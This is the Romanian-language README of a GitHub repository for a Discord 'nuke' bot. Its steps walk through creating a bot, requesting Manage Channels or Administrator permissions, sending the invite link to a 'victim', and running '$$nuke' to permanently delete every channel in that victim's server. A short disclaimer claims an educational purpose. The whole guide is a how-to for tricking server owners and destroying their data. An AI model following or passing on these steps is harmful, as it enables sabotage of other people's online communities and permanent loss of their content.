# DiscordNuke

## Ce este asta?
Acesta este un repository care contine codul sursa al unui bot de tip nuke pentru discord, facut de mine. O singura comanda, si fiecare canal din server dispare. Simplu?

## Ghid de utilizare
1. Asigurati-va ca aveti instalat **NodeJs Versiunea 16+** (https://nodejs.org/dist/v16.13.1/node-v16.13.1-x64.msi) pe calculatorul sau VPS-ul vostru.
2. Cand instalati NodeJs, sa fiti siguri ca instalati si NPM (pentru a instala dependitele botului).
3. Downloadati repositoryul ca ZIP pe calculator/VPS si ii dati unzip undeva unde il puteti gasi cu usurinta.
4. Deschideti CMDul si dati ./cd pana in locatia folderului extractat.
5. Rulati comanda "npm i" pentru a instala dependitele botului.
6. Duceti-va pe https://discord.com/developers/applications, apasati pe "New Application" si puneti ce nume va doriti.
7. Dati clic pe aplicatia creata pentru a intra in ea, iar apoi apasati pe "Bot".
8. Dati clic pe "New Bot" pentru a crea botul.
9. **ACTIVATI PRESENCE INTENT SI SERVER MEMBERS INTENT!**
10. Dati clic pe Copy, sus, la Token pentru a copia tokenul botului.
11. Intoarceti-va la folderul botului, intrati in el, si deschideti "slappey.json", iar acolo unde scrie "token", inlocuiti INLOCUIESTE CU TOKENUL BOTULUI TAU cu tokenul copiat (NU STERGETI ""). **NU UITATI SA APASATI DUPA PE FILE -> SAVE!**
12. Deschideti "config.json" si inlocuiti INLOCUIESTE CU IDUL TAU DE PE DISCORD cu ID-ul vostru de pe Discord (https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID-) (NU STERGETI ""). **NU UITATI SA APASATI DUPA PE FILE -> SAVE!**
13. Intoarceti-va la aplicatia de pe discord developer, deschideti "OAuth2" si copiati Client Id.
14. Intrati pe https://discordapi.com/permissions.html, alegeti optinuea de "Manage Channels" (optional si de "Administrator"), apoi dati paste la Client Id in casuta "Client ID" si dati copy la linkul care va apare jos, cu alb.
15. Intoarceti-va in CMD si rulati comanda "npm run start" pentru a porni botul (daca va apare vreo eroare, revizuiti pasii anteriori);
16. Dati linkul copiat de la pasul 14, victimei.
17. Cand le e lumea mai draga, executa "$$nuke", iar fiecare canal o sa fie sters definitiv.

## Probleme?
Aia e.

# DISCLAIMER!
Acest cod a fost publicat **STRICT** pentru motive educationale. **NU-L FOLOSITI PENTRU RAU, DE PREFERAT NUMAI INTRE PRIETENI!** Daca o faceti, eu nu raspund cu **ABSOLUT NIMIC!**
